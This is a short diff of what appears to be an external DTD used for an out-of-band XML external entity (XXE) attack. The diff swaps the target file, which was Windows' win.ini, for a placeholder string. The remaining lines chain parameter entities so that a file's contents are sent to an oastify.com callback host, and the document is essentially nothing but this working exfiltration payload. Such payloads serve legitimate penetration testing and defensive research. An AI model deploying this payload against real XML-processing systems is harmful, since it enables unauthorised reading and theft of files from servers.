@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % file SYSTEM "tsetset">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://sc80n6ch61v7tvqvvm210ra3lurtfw3l.oastify.com/?x=%file;'>">
 %eval;
 %exfil;
